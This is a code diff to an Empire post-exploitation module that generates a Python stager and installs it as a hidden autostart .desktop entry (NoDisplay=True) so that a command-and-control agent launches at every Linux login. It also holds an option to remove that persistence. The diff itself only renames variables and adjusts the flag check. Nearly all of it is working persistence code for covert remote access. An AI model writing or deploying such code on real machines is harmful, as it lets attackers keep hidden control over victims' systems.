@@ -82,8 +82,8 @@ class Module:
                     self.options[option]['Value'] = value
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
-        Remove = self.options['Remove']['Value']
-        FileName = self.options['FileName']['Value']
+        remove = self.options['Remove']['Value']
+        fileName = self.options['FileName']['Value']
         listenerName = self.options['Listener']['Value']
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python')
         launcher = launcher.strip('echo').strip(' | /usr/bin/python &')
@@ -93,36 +93,36 @@ Name=%s
 Exec=python -c %s
 Type=Application
 NoDisplay=True
-""" % (FileName, launcher)
+""" % (fileName, launcher)
         script = """
 import subprocess
 import sys
 import os
-Remove = "%s"
+remove = "%s"
 dtFile = \"\"\"
 %s
 \"\"\"
 home = os.path.expanduser("~")
-FilePath = home + "/.config/autostart/"
-WriteFile = FilePath + "%s.desktop"
+filePath = home + "/.config/autostart/"
+writeFile = filePath + "%s.desktop"
 
-if Remove == "True":
-    if os.path.isfile(WriteFile):
-        os.remove(WriteFile)
+if remove.lower() == "true":
+    if os.path.isfile(writeFile):
+        os.remove(writeFile)
         print "\\n[+] Persistence has been removed"
     else:
         print "\\n[-] Persistence file does not exist, nothing removed"
 
 else:
-    if not os.path.exists(FilePath):
-        os.makedirs(FilePath)
-    e = open(WriteFile,'wb')
+    if not os.path.exists(filePath):
+        os.makedirs(filePath)
+    e = open(writeFile,'wb')
     e.write(dtFile)
     e.close()
 
     print "\\n[+] Persistence has been installed: ~/.config/autostart/%s"
     print "\\n[+] Empire daemon has been written to %s"
 
-""" % (Remove, dtSettings, FileName, FileName, FileName)
+""" % (remove, dtSettings, fileName, fileName, fileName)
 
         return script
